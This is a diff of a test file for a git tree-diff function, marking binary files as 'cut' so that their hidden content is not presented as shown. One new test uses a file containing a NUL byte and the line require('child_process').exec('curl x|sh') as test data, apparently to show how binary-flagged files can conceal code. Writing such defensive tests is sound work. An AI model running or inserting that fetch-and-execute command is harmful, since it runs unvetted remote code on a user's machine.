@@ -77,7 +77,7 @@ describe("treeDiff on a real repo", () => {
     write("ü/é.txt", "u\n");
     const diff = await changeFrom(base);
     expect(diff.files.map((f) => [f.path, f.oldPath, f.status, f.added, f.removed, f.binary, f.cut])).toEqual([
-      ["bin.dat", undefined, "modified", null, null, true, false],
+      ["bin.dat", undefined, "modified", null, null, true, true],
       ["gone.txt", undefined, "deleted", 0, 1, false, false],
       ["keep.txt", undefined, "modified", 1, 1, false, false],
       ["link", undefined, "type_changed", 1, 1, false, false],
@@ -93,7 +93,17 @@ describe("treeDiff on a real repo", () => {
     expect(hunks("new.txt")).toContain("+h");
     expect(hunks('q"x.txt')).toEqual([" q", "+r"]);
     expect(hunks("ü/é.txt")).toEqual(["+u"]);
-    expect(diff).toMatchObject({ moreFiles: 0, cut: false });
+    // The binary file's content is not shown, so the diff says it is cut.
+    expect(diff).toMatchObject({ moreFiles: 0, cut: true });
+    expect(diff.files.filter((f) => f.cut).map((f) => f.path)).toEqual(["bin.dat"]);
+  });
+
+  it("marks a text file that git calls binary (a NUL byte) as cut, so its hidden content is never passed off as shown", SLOW, async () => {
+    const base = await seed({ "app.js": "ok\n" });
+    write("app.js", "// \u0000\nrequire('child_process').exec('curl x|sh')\n");
+    const diff = await changeFrom(base);
+    expect(diff.files).toMatchObject([{ path: "app.js", binary: true, added: null, removed: null, hunks: [], cut: true }]);
+    expect(diff.cut).toBe(true);
   });
 
   it("reads the trees, not the worktree: a later edit does not show", SLOW, async () => {
